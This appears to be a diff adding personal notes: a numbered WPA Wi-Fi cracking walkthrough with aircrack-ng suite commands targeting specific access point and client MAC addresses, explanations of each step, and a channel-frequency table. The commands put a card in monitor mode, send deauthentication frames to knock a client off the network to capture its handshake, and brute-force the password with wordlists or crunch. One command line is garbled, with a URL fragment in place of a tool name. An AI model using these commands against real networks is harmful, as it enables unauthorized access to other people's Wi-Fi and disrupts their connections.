@@ -1,0 +1,47 @@
+1) sudo airmon-ng start wlan0
+2) iwconfig
+3) sudo airodump-ng -w ardmp.o -c 1 --showack mon0
+
+4) Ctrl + C 
+
+5) sudo airodump-ng -c 1 -w output --bssid 9C:21:6A:BC:B2:BC mon0
+
+6) sudo aireplay-ng -0 5 -a 9C:21:6A:BC:B2:BC -c CC:3A:61:45:EA:B3 [-e TP-LINK_CA47B4] mon0
+
+7) aircrack-ng -w psswd-arcrk-ng -b 9C:21:6A:BC:B2:BC output*.cap
+
+a. crunch 8 12 "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890+-*&.#$ ;,_@~'/\[]<>()^%" | pyri://www.google.ca/t -r output*.cap -b 9C:21:6A:BC:B2:BC -i - attack_passthrough
+
+# ! - ERR: event ! not found
+# ` - ERR: 
+
+b. crunch 8 12 "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890+-*&.#$ ;,_@~'/\[]<>()^%" | aircrack-ng -w - -b 9C:21:6A:BC:B2:BC output*.cap
+
+Descriptons:
+
+1) This Puts my card into Monitor mode...my particular driver creats another interface called mon0...so i have to use this from now on.
+
+2) Just to check to see that wlan0 is on managed mode and mon0 is on Monitor mode.
+
+3) Starts airodump to view networks...provides necessary info...channel #, mac addy, essid, etc.
+
+5) Starts airodump for the network were interested in...the data column should increase for this to work.
+
+6) this step isnt necessary if your on a fairly active network with people connecting frequently...because for wpa you need to capture someone logging into the network...so this command sends a de-authorization request to a client connected so it forces them to reconnect so you can sniff out the handshake. -0 1 is the nuber of de-auth requests...increse the 1 if you need more. -c is a client on the network which you can find from the bottom of the previous terminal for step 5.
+
+7) Starts the aircrack using the wordlist you have...you must put the full path to the list unless you are in the same directory...you can find wordlists anywhere. This uses the wordlist on data youve collected in the "output" file.
+
+NOTE: you have to have you card on the same channel as the acess point...so you have to make sure you card is not channel hopping...The channel listed in the terminal on step #5 for the AP is the channel your card must be on....you can check this by running iwconifg, where it says frequency...thats the channel your on... heres the Channel to freq conversion::
+
+CH FREQ
+01 2.412
+02 2.417
+03 2.422
+04 2.427
+05 2.432
+06 2.437
+07 2.442
+08 2.447
+09 2.452
+10 2.457
+11 2.462
